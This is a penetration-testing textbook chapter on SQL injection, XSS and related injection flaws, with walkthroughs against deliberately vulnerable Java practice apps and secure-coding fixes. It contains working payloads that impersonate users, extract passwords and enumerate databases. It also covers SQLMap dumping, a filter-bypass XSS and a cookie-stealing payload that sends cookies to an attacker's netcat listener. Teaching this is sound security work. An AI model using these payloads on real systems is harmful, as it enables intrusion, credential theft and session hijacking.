Injection attacks haunt developers and security professionals alike. These insidious exploits can undermine the foundations of secure software, jeopardizing sensitive data, user privacy, and system integrity. In this chapter, we will journey through the labyrinth of injection vulnerabilities, exploring the dark corners of SQL injection, cross-site Scripting (XSS), command injection, Extensible Markup Language (XML) injection, and XPath injection. Through this exploration, we will equip you with the knowledge and tools needed to find, mitigate, and ultimately defeat these threats. This chapter is a practical guide to software security. It includes information on harnessing SQLMap for flushing out SQL injection vulnerabilities and unraveling the nuances of various XSS flavors. As we delve into practical examples and Java-specific secure coding advice, you will discover that safeguarding your applications against injection attacks is not just an option; it is a necessity in an era where data breaches and cyberattacks, malicious activities with the intent of stealing, destroying, exposing or altering data or applications, loom large.

[Structure](#contents.xhtml_sc2_42a)

This chapter will discuss injection attacks, including:

*   SQL injection
*   Cross-site scripting
*   Command injection
*   XML injection
*   XPath injection

[Objectives](#contents.xhtml_sc2_43a)

By the end of this chapter, you will be familiar with SQL injection, what it is, how to discover it, the risks, and how you can quickly fix it with simple code choices in Java. You will learn the three XSS types and how to fix those with Java libraries. We will briefly review command, XML, and XPath injection examples, including Java-specific secure coding advice.

[SQL injection](#contents.xhtml_sc2_44a)

Injection attacks are a class of attacks where a malicious user tricks an application into including unexpected commands in the data sent to be interpreted. Therefore, SQL injection is when a malicious user tricks the SQL interpreter into executing a different query than the application intended.

SQL injection is the oldest known injection type. For most SQL queries, fixing this is accessible without changing the query. We will also discuss a few spots in a SQL query where user input cannot be used, and in those instances, the design may need to change.

When an SQL injection is found, the whole database, including tables not used by the application, can be read and modified. Sometimes, you can even access an operating system’s shell from an SQL injection.

The following subsection will look at how to test for simple SQL injections, walking through a manual test. Next, we will discuss how to extract interesting information from the database manually. Then, a subsection will cover using tools for discovery and data extraction via SQL Injection. Finally, secure coding advice to avoid SQL injection will be covered.

[Common SQL injection techniques](#contents.xhtml_sc3_45a)

The two most common techniques are the union-based SQL injection and the error-based SQL injection. In the union-based technique, the SQL injection will create a union statement that returns several select queries. For example, consider the following SQL: select * from products where product_name = ‘USER INPUT’. If the string User Input is injectable, you can inject a union clause. The SQL does not tell us how many columns products are returning. So, the first part of testing for a union-based SQL injection is determining the number of items returned.

This is done by injecting a union query with null. For example, the first user input may be ‘test’ union null --. This results in the following query being run SQL select * from products where product_name = ‘test’ union null -- ‘. If the SQL injection causes an error, add nulls until it does not. Second, you would try: test’ union null, null --. Then, third, try test’ union null, null, null--. There may be many columns being returned. Where five columns or six or seven is standard after ten, the chance of this working will be diminished. Choose a number from 10 to 15, depending on how thorough you want to be, and stop if you have no success.

If you succeed, you can use a different select query for each null to gather data. Remember that types matter, so the selected query should match the type returned by the original query at the spot, whether string, integer, or Boolean, etc.

The error-based SQL injection technique is when you find that the page errors if given a specific condition and does not otherwise. Consider the same SQL query as above. To try the error-based technique, we may try to find two cases, one where we get an error and the other where we do not. We may try the following two inputs: x’ and ‘1’=’2 and x’ and ‘1’ = ‘1. This injection would cause the following SQL to execute: SQL select * from products where product_name = ‘x’ and ‘1’=’2’ and SQL select * from products where product_name = ‘x’ and ‘1’=’1’. Assuming x is a valid product_name, the first SQL query would provide an error, and the second would not. In this case, we can make guesses or use brute force and the substring command to extract information. One example would be to guess the username is root. We could use the following input x’ and user()=’root, which would execute the query: SQL select * from products where product_name = ‘x’ and user()=’root’. The user() function is specific to MySQL and various clones. To check the username's first letter for the value r, the input should be x’ and substring(user(), 1,1)=’r. This will result in the following SQL: SQL select * from products where product_name = ‘x’ and substring(user(), 1, 1)=’r’.

[Simple manual testing of SQL injection](#contents.xhtml_sc3_46a)

If you performed mapping on the application, the first step for testing for SQL injection is to refer to your mapping notes and look for the pages and fields that looked like they were used as input to a database.

In the simple case, when the application does not try to stop SQL injection often, we can use one of several special characters to find an injection point. These special characters are:

*   The single quote (')
*   The semi-colon (;)

In the simple case, we often get a generic error page that can tell us information about the query we are injecting into.

We will perform initial testing using the habit helper ctf web application.

Start the habit helper web application. The web and mobile applications are available on GitHub at: [https://github.com/securitymagick/JavaPentestingExamples](https://github.com/securitymagick/JavaPentestingExamples). If you need help getting set up, please check the help provided in the GitHub repository.

The habit helper web application is set up as a capture-the-flag competition, and this version has hidden flags. The flags may be displayed on the page or appear as a pop-up as you test. For our purposes, you may ignore these flags. As an independent exercise, you can try to find all ten hidden flags.

When penetration testing, it is essential never to use any real credentials that you may use for real accounts. Choose values that are unique and easily recognizable in later requests. For example, you do not want your username to be the same as your password or any other field required for registration. This is to make it easier to decipher which field may be vulnerable to an attack.

The first page of the web application offers options to log in, register, forget password, or learn about the application. Select the Register button, create a user, and then log in with the created credentials.

From the account menu, scroll to the Forum button below and click View details:

![](images/Figure_4.1.png)

Figure 4.1: Habit Helper application forums

Then, you will be asked to read or write a post. Click on the View details under Posts, as shown in the following figure:

![](images/Figure_4.2.png)

Figure 4.2: Habit Helper application posts

Then, a list of posts will be shown. Click on the first post's title, Welcome to Habit Helper, as shown in the following figure:

![](images/Figure_4.3.png)

Figure 4.3: Habit Helper application first post

Now, you will be taken to the post page. Beneath the post are several comments and an Add a comment form. Try adding a simple comment with a single parenthesis ‘ such as the following example:

![](images/Figure_4.4.png)

Figure 4.4: Habit Helper testing for injection

This will return a 500 error that gives many details about the SQL. An example of this error message is shown as follows:

![](images/Figure_4.5.png)

Figure 4.5: Habit Helper SQL error

This error message is full of interesting information. First, we can see the query that failed: INSERT INTO comments VALUES (?, ?, ‘is this an injection’’, :username)

Further, there is a table called comments that most likely has four columns in it. At the very least, there are four fields in an insert command. The third field is the comment itself, which we control as a user, and the fourth is the username, which looks like a bind variable at first guess. As the user, we can control the third field. Since there is SQL injection, we can also control the fourth field. The username is printed on the screen in the comments, as seen in [Figure 4.5](#ch04.xhtml_fig4-5).

First, let us perform a simple SQL injection to pretend to be a different user. We can do this by creating the SQL statement from the comment added to the post and adding comment symbols to the end. Depending on the SQL server, comments can have different values. The most common comments are two minus signs: '--' with or without a space in front, the /* */ and #. So, let us impersonate Lizzie, the founder, and say that the website is a fraud. We will try the ‘--' style comment. Thus, our comment will be: This is a fraud’,’Lizzie’)--

Refer to the following figure:

![](images/Figure_4.6.png)

Figure 4.6: Simple SQL injection

This should create and execute the following SQL query: INSERT INTO comments VALUES (?, ?, ‘This is a fraud’,’Lizzie’)--,: username)

We can see our comments when the page refreshes, as shown in the following figure:

![](images/Figure_4.7.png)

Figure 4.7: Simple SQL injection results

Since the fourth field is viewable from the web application, we could query interesting information from the web application this way. We can use a select SQL query after the comment to insert something that we would like to see, such as a password field. The only table name we have – comments -- is named based on what it stores. The most straightforward guess for the table that stores the usernames and passwords of would-be users. The variable username is passed to the SQL we saw in the error message. There is a good chance that it is the name of a column. We will guess the column name password. After the comment, let us try to add the following second SQL query: select password from users where username = ‘Lizzie’. Thus, the whole comment is Great pages’; select password from users where username = ‘Lizzie’)--.

Refer to the following figure:

![](images/Figure_4.8.png)

Figure 4.8: SQL injection to find passwords

The SQL executed is: INSERT INTO comments VALUES (?, ?, ‘Great pages’, select password from users where username = ‘Lizzie’)--,: username).

This will refresh the page and see the following new comments added:

![](images/Figure_4.9.png)

Figure 4.9: SQL injection found password result

This comment tells us the following three things:

*   Lizzie’s password is cookies.
*   We correctly guessed the user table, username, and password fields.
*   The passwords are stored in plaintext.

The following subsection will look at manually pulling interesting information from an SQL injection. Another manual SQL injection walk-through (using the Boolean-based) technique can be found in [Chapter 10](#ch10.xhtml), Authentication Bypass Via SQL Injection.

[Using SQL injection to extract information manually](#contents.xhtml_sc3_47a)

Extracting information from the database depends on what database and version are being run. Enumeration can be tricky when a non-standard database is used. Refer to the following table to know what SQL to use to find basic information about the database. All information provided here concerns the three most common databases: MySQL, MS SQL, and Oracle. If your application uses a different database, you must look up the keywords to use:

| Command description | MySQL | MS SQL | Oracle |
| The user who is running the database. | User()SESSION_USER()CURRENT_USER()SYSTEM_USER() | SYSTEM_USERUSERsuser_sname() | UserSELECT user FROM DUAL |
| All users (or administrators) | SELECT user FROM MYSQL.USER;SELECT user FROM MYSQL.USER WHERE Super_priv = 'Y'; | SELECT name FROM SYSLOGINSSELECT loginname FROM SYSLOGINS where sysadmin=1 | SELECT username FROM USER_USERSSELECT username FROM ALL_USERS |
| Database list | SELECT schema_name FROM information_schema.schemata; | SELECT name FROM sysdatabases;SELECT name FROM master..sysdatabases; | SELECT TABLESPACE_NAME FROM USER_TABLESPACES |
| Current database | DATABASE()SCHEMA() | DB_NAME() |  |
| Database version | @@VERSIONVERSION()@@GLOBAL.VERSION | @@VERSION | version FROM v$instancebanner FROM V$VERSION WHERE banner LIKE 'oracle%' |
| Database tables | SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES; | SELECT table_name FROM INFORMATION_SCHEMA.TABLESSELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_type = 'BASE TABLE | SELECT table_name, tablespace_name FROM all_tablesSELECT table_name, tablespace_name FROM SYS.all_tables |

Table 4.1: Interesting database queries

The commands and keywords can be used in select queries or as substrings to return data.

In our previous SQL injection example, let us try to find the current database name and username. First, try to use the DATABASE() function from MySQL. Our comment will be: This is a SQL injection returning the current database as username ‘, SELECT DATABASE())--.

Refer to the following figure:

![](images/Figure_4.10.png)

Figure 4.10: SQL injection with interesting database queries

A comment is added. After the page refreshes, we see the new comment shown in the following figure:

![](images/Figure_4.11.png)

Figure 4.11: Interesting database query results

So, the current database name is TESTDB. Now, let us try to find the username using the MySQL User() function. In this case, the comment will be: This is a SQL injection where the database user is the username, User())--.

Refer to the following figure:

![](images/Figure_4.12.png)

Figure 4.12: More SQL injection with interesting database queries

The page refreshes, and the new comment is shown as follows:

![](images/Figure_4.13.png)

Figure 4.13: Results of more interesting database queries

We see that the user is SA.

[SQL injection tools](#contents.xhtml_sc3_48a)

This section will look at using Burp Suite Intruder with fuzzing lists to detect SQL injection and SQLMap to dump databases.

[Burp Suite fuzzing](#contents.xhtml_sc4_49a)

Apart from manually testing SQL injection possibilities, another good way to try to check input is to use fuzzing lists. Burp Suite currently comes with built-in fuzzing lists. In the current example, the fourth field, username, is set by a hidden field in the form and would be manipulable by a user in the HTTP request. The following is an HTTP request from one of our earlier SQL injections:

![](images/Figure_4.14.png)

Figure 4.14: HTTP request with possible SQL injection

So, to fuzz this request and check if the username field is injectable, right-click on the request and select from the sub menu: Send to Intruder. Refer to the following figure:

![](images/Figure_4.15.png)

Figure 4.15: Burp Suite right-click menu

You may also use the keyboard shortcut Ctrl+I. Now, move to the Intruder window to configure the attack. On the Positions tab, click the Clear button. Refer to the following figure:

![](images/Figure_4.16.jpg)

Figure 4.16: Burp Suite Intruder payload positions for SQL injection fuzzing

Then highlight the username pumpkin and click Add. Also, change the comment so it does not have a SQL injection. Refer to the following figure:

![](images/Figure_4.17.jpg)

Figure 4.17: Burp Suite set-up payload for fuzzing SQL injection testing

Next, click the Payloads tab. The payload type simple list will be selected by default. Under the payload options for a simple list, click Add from the list:

![](images/Figure_4.18.png)

Figure 4.18: Burp Suite Intruder add payloads from list

Find the list titled Fuzzing - SQL injection and select it. Refer to the following figure:

![](images/Figure_4.19.png)

Figure 4.19: Select fuzzing: SQL injection list

Then click the Start attack button on the upper right.

After the attack, sort the results by size or error code; there were 200 results where the possible SQL injection added a comment and did not inject at all. Several where the size of the field caused an SQL error are shown as follows:

![](images/Figure_4.20.png)

Figure 4.20: Verbose error in SQL from fuzzing

This error is verbose and gives us information about the database fields but is not proof of an injection. This shows us that the column name is AUTHOR and is VARCHAR of size 32.

The only other error is a duplicate key error shown as follows:

![](images/Figure_4.21.png)

Figure 4.21: Verbose duplicate key error from fuzzing

This is not proof of injection either. It shows that Burp Suite Intruder worked quickly enough initially that a concurrency issue happened, and the program designated two items with the same key. Concurrency issues are part of business logic and will be discussed in [Chapter 8](#ch08.xhtml), Executing Business Logic Vulnerabilities.

[SQLMAP to dump databases](#contents.xhtml_sc4_50a)

SQLMAP is a tool automatically included in Kali Linux and can be downloaded and installed on any Linux OS, Windows, or Mac. SQLMAP can be used to find SQL injections, but it is a very loud tool. It will set off any security alarms the website may have when used to locate an unknown SQL injection. SQLMap should never be used on the system without explicit penetration testing permissions. Many professional penetration testers consider SQLMap better suited to extracting data after SQL injection has been located by other means. Several tutorials and exercises are available if you are interested in SQLMap for finding SQL injections. For an example, please see [https://allabouttesting.org/quick-tutorial-identify-sql-injection-vulnerability-with-sqlmap/](https://allabouttesting.org/quick-tutorial-identify-sql-injection-vulnerability-with-sqlmap/).

The first step to using SQLMAP to dump data is for SQLMAP to recognize the SQL injection. It is best to give SQLMAP the request, the parameter the SQL injection is in, and the database type if you figure it out. The easiest way to use SQLMAP - this works every time, whether the request is a get, post, or something obscure, is to save the request as a text file. One way to copy this from Burp Suite is to highlight the text of the request and then right-click. Select Copy to file as shown in the following figure:

![](images/Figure_4.22.png)

Figure 4.22: Saving HTTP request to text file in Burp Suite

This will then prompt you for a file name. Assume we saved this as SQLI.txt. Then, to run the SQLMAP tool with this request, we would use the following command:

sqlmap -r SQLI.txt -p comment

This says to use the request in the text file SQLI.txt. The injectable parameter is a comment. We can add a flag to set the database type. If we think this database must be MySQL, we could limit SQLMAP with the –dbms=MySQL flag.

After SQLMAP confirms the SQL injection, we can easily dump data. Let us look at the SQLMap help to see what our options are:

![](images/Figure_4.23.png)

Figure 4.23: SQLMAP options

To dump everything, use the –dump-all flag. To dump selected items, use –dump and then choose additional information of interest, such as -D databaseName, -T tableName, -C columnName.

[SQL injection secure coding practices](#contents.xhtml_sc3_51a)

SQL injection can be easily thwarted in most cases. Using parametrized queries with bind variables for all user-controllable input is effective against SQL injection. This change does not affect the business logic, and there is no usability reason not to always use parameterized queries with bind variables. Several different libraries are commonly used in Java for working with databases and SQL. Following are two examples showing various libraries and how to turn SQL injections into secure code:

import java.sql.*;

// assume variable con has been started to the connection information for the

// database.

Statement st = con.createStatement();

ResultSet rs = st.executeQuery("select securityQuestion from catlovers where uname = '" + user + "'");

In this example, using the basic Java SQL libraries, the user variable causes an SQL injection by concatenating the variable to the query string:

import java.sql.*;

// assume variable con has been started to the connection information for the

// database.

String selectStatement = "select securityQuestion from cat lovers where uname = ? ";

PreparedStatement prepStmt = con.prepareStatement(selectStatement);

prepStmt.setString(1, user);

ResultSet rs = prepStmt.executeQuery();

The above code shows that the variables are no longer concatenated into the query string. Instead, a question mark is used. Then, we used a PreparedStatement variable instead of a Statement variable to call the query. The bind variables are set using the setString function, which takes two parameters: an integer and a string. The integer represents which variable in the statement this value represents, and the order is from left to right. The string holds the value to use for that variable.

Here is a second code example in Java using Spring’s JDBC libraries:

import org.springframework.jdbc.core.namedparam.NamedParameterJdbcTemplate;

String SQL = "SELECT * FROM Employee WHERE empid = “ + empid.toString();

Map<String, Object> params = new HashMap<String, Object>();

Employee employee = (Employee) namedParameterJdbcTemplate.queryForObject(SQL, params, new EmployeeMapper());

In the example above, the variable empid is concatenated to the SQL query, causing the possibility of SQL injection.

The next example shows how to use a bind variable to fix the previous SQL injection:

import org.springframework.jdbc.core.namedparam.NamedParameterJdbcTemplate;

String SQL = "SELECT * FROM Employee WHERE empid = :empid";

SqlParameterSource params= new MapSqlParameterSource("empid", Integer.valueOf(empid));

Employee employee = (Employee) namedParameterJdbcTemplate.queryForObject(SQL, params, new EmployeeMapper());

In the code above, the SQL query does not concatenate the variable. Instead, the bind variable inside the query is represented with a colon followed by a variable name. In this example, the bind variable is represented by :empid. Then, the bind variable is stored in the params variable, which was empty in the vulnerable example. This puts the variable name and the value into a Map element. These are passed to the namedParameterJdbcTemplate, which executes the query.

In both cases, switching to a parameterized query and bind variable is accessible and 100% effective. Bind variables can be used when the user-controlled input is a value inserted or compared in SQL. This is the most common use case for user input. Let us look at an example where the user-controlled input cannot be put in a bind variable.

For example, two websites with different users are stored in separate tables. They both use the same code and database and have other user tables called table_accounts and table_admin. The SQL query being run looks like this:

“Select password from table”+ sitename + “ where username=?”

Sitename is retrieved from the HTTP request. This could be a cookie value, URL part, hidden form variable, or header value.

A malicious attacker can intercept and modify the HTTP request; thus, this query is vulnerable to SQL injection. The table name cannot be set using a bind variable.

So, in this case, there are only two options. The first is to use allowlist input validation. Allowlist input validation means that you verify that the input is on your list, and if not, you throw an error and do not execute the code. The second option is to redesign or factor the code to avoid this. In the case of existing functionality, the allowlist is a reasonably quick fix.

One question often arises: can input validation fix SQL injection? The answer is that it depends on the input. For strict inputs like a zip code, which is generally checked to see that it is precisely five integers, SQL injection, as well as most injection attacks, becomes impossible with properly implemented input validation. Open-ended text fields often need to allow special characters used by SQL. Let us consider a password field. The password should be a seemingly random combination of upper and lowercase letters, numbers, and special characters. Current standards suggest allowing up to 64 characters, including spaces. Thus, passwords that might cause an injection, such as Pass’ OR ‘17’=’17, should be allowed.

It is also possible to have an RFC valid email address that could cause an SQL injection. Thus, input validation is part of the defense in depth, but there is no silver bullet for SQL injection.

We cannot use deny listing for special characters to stop SQL injection. The application logic may require the deny listed characters. Various encodings and language options make it challenging to ensure you have deny listed everything necessary. New attack vectors can be discovered, leading to a quick need to patch your denylist.

For added defense in depth, limit your database privileges so that an SQL injection cannot compromise operating systems. Remember to use parameterized queries with bind variables; when impossible, perform allowlist input validation. Other input validation adds to your defense in depth.

[Cross-site scripting](#contents.xhtml_sc2_52a)

XSS is an injection attack where a malicious user inputs a script, generally JavaScript, as input. The browser executes this script. There are three types of XSS: reflected, stored, and document object model (DOM). Reflected XSS is when the malicious input is reflected in the HTTP response. Some browsers have settings that will stop reflected XSS by default. Stored XSS is when the malicious input is stored in a database or file and returned in any HTTP response that access the stored data. Stored often has a more significant impact than reflected XSS as reflected can often only affect one user, while stored may be able to affect many users.

The DOM XSS is when the malicious input is not included in the HTTP response. In this case, the injection changes the DOM, causing client side code to execute differently. An example would be injecting into a URL parameter used in client-side JavaScript.

Generally, examples of XSS show JavaScript alert pop-ups as proof of concept (PoC). This leads some people to think that XSS is just an annoying prank instead of a real threat. With XSS, you can steal a user's session, steal sensitive data, rewrite a web page, redirect a user to fishing or malware sites, and install an XSS proxy, which allows the attacker to see and direct all the users' behavior on vulnerable sites and force the user to other sites.

When testing for XSS, you want to look for places that you found in mapping where input that you, as the user, entered gets displayed on the screen or in the hidden HTML that is not displayed on the screen. There are many lists available for different XSS injections to try. One good comprehensive list is the OWASP cross-site scripting filter invasion cheat sheet, which will give you an exhaustive list. You can find this cheat sheet located at: [https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html).

The easiest XSS to try is a simple <script>alert(1)</script>. Another quick test can be to use the <plaintext> HTML tag. However, in the case of stored XSS, this may break the web page.

The <marquee> tag can be preferable to the plaintext tag. It is apparent when it works and does not mess up the functionality. Testing for the <plaintext> and the <marquee> are two ways to see if you can use the less than and greater than signs, although they are unnecessary for XSS. The following subsection will use two manual test examples for stored XSS. Then, we walk through the DOM cross-site scripting example. The next section will show how to steal cookies during session hijacking. Finally, the section concludes with secure coding guidelines for cross-site scripting. There are two XSS examples in [Chapter 6](#ch06.xhtml), CORs Exploitation. One is on bypassing client-side controls in the section entitled Client-side Code. The other is on stealing localStorage and sessionStorage in the Client-side Storage section.

[Two stored cross-site scripting walkthroughs](#contents.xhtml_sc3_53a)

The following examples will use the three Amazing Myths applications. The Amazing Myth applications are three versions of the same application with different security features. The amazing-myths-3 example is the easiest, so we will begin from there.

If you still need to set up the sample applications, refer to [Chapter 2](#ch02.xhtml), Sample Application Setup, for help. If you have not registered a test user on the main page, do so now and then log in with the new credentials. This will take you to the myAccount page. From the list of options, select Read Posts by clicking on the View details under it, as shown in the following figure:

![](images/Figure_4.24.png)

Figure 4.24: Amazing-Myths-3 menu option read posts

Select the first post shown below from the list of posts for testing:

![](images/Figure_4.25.png)

Figure 4.25: Amazing-Myths-3 select the first post

Under the post and existing comments is a spot to add a comment. Let us try the marquee tag first. Our comment will be <marquee>Testing testing 1\. 2\. 3</marquee> shown as follows:

![](images/Figure_4.26.png)

Figure 4.26: Using marquee tag to test injection point

After that, the page refreshes, alerting us that the comment has been added. Scrolling down, we see our analysis moving across the screen—the less than and greater than signs were accepted. Refer to the following figure:

![](images/Figure_4.27.png)

Figure 4.27: Marquee tag testing results

Now, let us try the basic JavaScript <script>alert(1)</script>. After entering the comment, we see an error message displayed, and the Add Comment button has been turned off. Refer to the following figure:

![](images/Figure_4.28.png)

Figure 4.28: Using script tag to test for XSS

Since we did not submit anything, this was most likely done in JavaScript, so let us look at the HTML and see what is happening. The HTML shows that for each character entered, a JavaScript function named testText is called:

![](images/Figure_4.29.png)

Figure 4.29: HTML shows JavaScript function called each key press

Checking for this function’s code, it is found in a file called hello.js. The testText function is as follows:

function testText(text, documentPlace, submitButton)

{

var intScore = 1;

var strVerdict = "";

var strFont = "text-success";

//Check for common ways to start java

if (text.match(/(<script|<SCRIPT|<img src="javascript:|<img src=javascript:)/)){

intScore=0;

}

if(intScore < 1)

{

strVerdict = "We love you making your posts and comments look good with tags, but for security reason can't allow javascript.";

strFont="text-danger";

submitButton.setAttribute('disabled', true);

}

else {

submitButton.removeAttribute('disabled');

if (text.length >23)

{

strVerdict = "Awesome Zoo Baby!  Awesome Thoughts!";

strFont="text-success";

}

}

document.getElementById(documentPlace).innerHTML = "<div class=\"text-center " + strFont + "\">" + strVerdict + "</div>"

}

This function only looks for all lowercase or all uppercase beginning script tags. As HTML is case insensitive, we can defeat this client-side feature using a mixed case <ScRipT> tag, shown as follows:

![](images/Figure_4.30.png)

Figure 4.30: Mixed case script tag bypass

Submitting this comment will refresh the page, and we can see our XSS in action before the rest of the page loads. Refer to the following figure:

![](images/Figure_4.31.png)

Figure 4.31: Mixed case script tag XSS is working

Now, let us continue with the amazing-myths-1 application. As in the first example, please register a new account and login if you have not already. From the myAccount page, go to the posts and select the first post. We will try to add comments to this example. Let us use our last payload from amazing-myths-3. If we add this to the text box, JavaScript is not blocked, as shown in the following figure:

![](images/Figure_4.32.png)

Figure 4.32: Amazing-myths-1 mixed case script tag XSS injection

So, let us submit our comments and see what happens. The page refreshes, but the XSS does not execute. There is a server-side control in place. The resulting comment is displayed as shown:

![](images/Figure_4.33.png)

Figure 4.33: Mixed case script tag does not execute

It looks like the first less than and greater than were encoded, but not the second. Let us check the HTML to see if that is correct:

![](images/Figure_4.34.png)

Figure 4.34: HTML of mixed case script tag

This HTML shows that only the first less than was encoded. This leaves a lot of options for continuing this attack. We could try different tags to see if those are encoded or experiment with more than one less-than sign to see if a second script tag would work. Our next possibility is to try two script tags, shown as follows:

![](images/Figure_4.35.png)

Figure 4.35: Two script tag payload

After adding the comment, the page refreshes, and we see that it did not work:

![](images/Figure_4.36.png)

Figure 4.36: Two script tag XSS attempt result

So, for our third attempt, we will try a different tag. Using the marquee tag payload from earlier, we see that this is not encoded. See inserting comment below:

![](images/Figure_4.37.png)

Figure 4.37: Testing the marquee tag in amazing-myths-1

In the following figure, the marquee tag scrolls across the screen, indicating that it is not encoded:

![](images/Figure_4.38.png)

Figure 4.38: Marquee tag results in amazing-myths-1

So, now is a good time to use a JavaScript event handler. Common choices are the onerror or onmouseover event handlers. They are used to trigger JavaScript payload. Let us use the onmouseover tag to trigger the JavaScript at will. Our payload will be <img src=x onmouseover=”alert(1)” /> as shown in the following figure:

![](images/Figure_4.39.png)

Figure 4.39: Using events to test for XSS

We see the new comment after clicking Add Comment and refreshing the page. As shown in the following figure, our alert pops up when moving the mouse over the broken image:

![](images/Figure_4.40.png)

Figure 4.40: Event Handler XSS results on Amazing-Myths-1

[DOM cross-site scripting walkthrough](#contents.xhtml_sc3_54a)

This section will look at an example of DOM cross-site scripting found in amazing-myths-3\. If necessary, register a new account and login. From the myAccount, go to the Vote  For your favorite myth menu choice.

![](images/Figure_4.41.png)

Figure 4.41: Vote for your favorite myth menu selection

Go ahead and vote. We are just observing the functionality, so it does not matter what you choose as input.

![](images/Figure_4.42.png)

Figure 4.42: Voting for favorite myth

After voting, the page refreshes, and you have the following message:

![](images/Figure_4.43.png)

Figure 4.43: Vote for favorite myth response

Looking at the link shows its value as: [http://127.0.0.1:8081/amazing-myths-3/vote?voteFor=Theseaus%20and%20the%20Minotaur](http://127.0.0.1:8081/amazing-myths-3/vote?voteFor=Theseaus%20and%20the%20Minotaur). Further investigation reveals the following JavaScript:

function Change() {

document.getElementById("voteFor").style.display = "block";

document.getElementById("change").style.display = "none";

}

function setVote() {

var url = new URL(window.location.href);

var value= "";

if (url.searchParams.get('voteFor')) {

var token = url.searchParams.get("voteFor");

sessionStorage.setItem("voteFor", token);

}

if (sessionStorage.getItem("voteFor")){

document.getElementById("voteFor").value = sessionStorage.getItem("voteFor");

document.getElementById("voteFor").style.display = "none";

document.getElementById("voteTag").innerHTML = "You are supporting " + sessionStorage.getItem("voteFor");

}

}

window.onload=setVote();

This shows that the get parameter voteFor is loaded into the sessionStorage and then stored in the innerHTML property. The innerHTML property is a way of getting or setting the HTML with an element. This means the DOM will execute the URL parameter and not be part of HTTP responses. Thus, the voteFor parameter is the injection point for a DOM XSS. This link is meant to be shared with others, making it the perfect spot for XSS.

If you try to click the link to see the message working in the DOM while logged into your current user, you will only get a message that you have already voted. So, save the link and register as a second user. After logging in with the second user, click the link to see the following:

![](images/Figure_4.44.png)

Figure 4.44: Voting link with new user

Now, we are ready to craft the payload for the XSS. The inner HTML element will not accept <script> tags, so we must use JavaScript event handlers to perform this XSS. Let us try using the onerror hander with the payload Theseaus and the Minotaur<img src=x; onerror="alert(1)”/>. We see our XSS execution after changing the get parameter to the payload.

![](images/Figure_4.45.png)

Figure 4.45: DOM XSS in voting link

[Cookie stealing with cross-site scripting](#contents.xhtml_sc3_55a)

So far, we have seen three examples of XSS, all alert textboxes. This works for a POC, but we sometimes want to prove the exploitability. So, the most common use case of XSS is to steal cookies from a website.

XSS will only steal cookies that do not have the HTMLOnly flag set to true.

It is easy to show what cookies we can steal by simply changing out the last payload to display the cookies that are accessible instead of the number 1\. This can be done by using the document.cookie value inside the alert. This is a JavaScript keyword that, when evaluated, will return all cookies that do not have the HTMLOnly flag set.

So this time, we will use the payload: Theseaus and the Minotaur<img src=x; onerror="alert(document.cookie)”/>. When we use this payload, we get the following results:

![](images/Figure_4.46.png)

Figure 4.46: Returning cookie values in XSS

The next step to steal the cookies via this link is to set up a listener to receive the data. We will do this using a Kali VM to represent the attacker. So, first run ifconfig to check the VMs IP, then set up the netcat listener on port 9393 – or another port of your choice – using the command nc -lvp 9393. Here, the flag l is for listen, the v is for verbose, and p is for port so that the listener will use the port supplied as the following parameter:

![](images/Figure_4.47.png)

Figure 4.47: Kali Linux ifconfig and start netcat listener

Using this information, we will change our payload so that the onerror event handler changes the image tags src value to point to our listener and attach the cookies. This will create the following payload: Theseaus and the Minotaur<img src=x; onerror=" this.src=’http://192.168.196.128/?cookie=’%2bdocument.cookie”/>. The %2b is URL encoded +. If left unencoded, the browser will interpret it as a space, and the payload will not work.

If we execute this, we see that the figure src has been updated using the inspect tool.

![](images/Figure_4.48.png)

Figure 4.48: Inspecting XSS HTML

If we check our listener, it receives the cookies.

![](images/Figure_4.49.png)

Figure 4.49: Netcat Listener receives HTTP Request with cookies

Where Netcat is one the easiest listeners to set up, you can use Python SimpleHttpServer or even Apache or Tomcat access logs to receive the cookies.

[Secure code guidelines to stop cross-site scripting](#contents.xhtml_sc3_56a)

In general, XSS should be fixed via output encoding. Using an allow list for all input validation is also acceptable. There are many caveats to this. There are several contexts in which it is unsafe to have untrusted data, including:

*   In a script
    *   <script> untrusted </script>
*   In an HTML comment
    *   <!– untrusted -->
*   In an attribute name
    *   <div untrusted=test />
*   In a tag name
    *   <untrusted href=“/”/>
*   Directly in a CSS
    *   <style> untrusted </style>

Use a well-known library to perform output encoding. The OWASP Encoder library – [https://owasp.org/www-project-java-encoder/](https://owasp.org/www-project-java-encoder/)  – is a small, lightweight encoder library for Java. It follows all best practices and is still supported. The OWASP ESAPI project also supplies similar encoding but is no longer being supported. Thus, this library is preferred. A separate library should be used for JSON, the OWASP JSON Sanitizer library is an easy to use choice: [https://owasp.org/json-sanitizer/](https://owasp.org/json-sanitizer/).

[JSP usage](#contents.xhtml_sc4_57a)

This example is for a JSP file. The usage for .tag files is done similarly.

1.  To encode in a JSP, first include the JSP library in your pom:

    <dependency>

    <groupId>org.owasp.encoder</groupId>

    <artifactId>encoder-jsp</artifactId>

    <version>1.2.3</version>

    </dependency>

2.  Add tag library:

    Then, add a reference to the tag library in your JSP file.

    <%@taglib prefix="e" uri="https://www.owasp.org/index.php/OWASP_Java_Encoder_Project" %>

3.  Encode:

    Find the data to encode and call the right function. See the chart at the bottom for a list of functions for each context. In the HTML itself, use ${e:forHtml(item.data)} or <e:forHtml value="${item.data}" />.

[Java usage](#contents.xhtml_sc4_58a)

The OWASP Encoder libraries can easily be used inside Java, too. Follow these simple steps:

1.  The POM file.

    First, add the encoder dependency to the pom file:

    <dependency>

    <groupId>org.owasp.encoder</groupId>

    <artifactId>encoder</artifactId>

    <version>1.2.3</version>

    </dependency>

2.  Add the import.

    In the Java file, put the import statement.

    import org.owasp.encoder.Encode;

3.  Encode.

    Choose the data to encode and call the right function. See the last section for a complete list of contexts and processes:

    Encode.forHtml(dataToEncode);

[Contexts and functions available](#contents.xhtml_sc4_59a)

HTML entity encoding should be used inside HTML tags like <body></body> or <div></div>. Use the function forHtmlContent(UNTRUSTED). UNTRUSTED represents the untrusted user input that is passed as a parameter to the function.

HTML attribute encoding is when the data is HTML attribute, i.e., inside the tag like a URL in a link as <a href="DATA"></a>. Then, use the function forHtmlAttribute(UNTRUSTED).

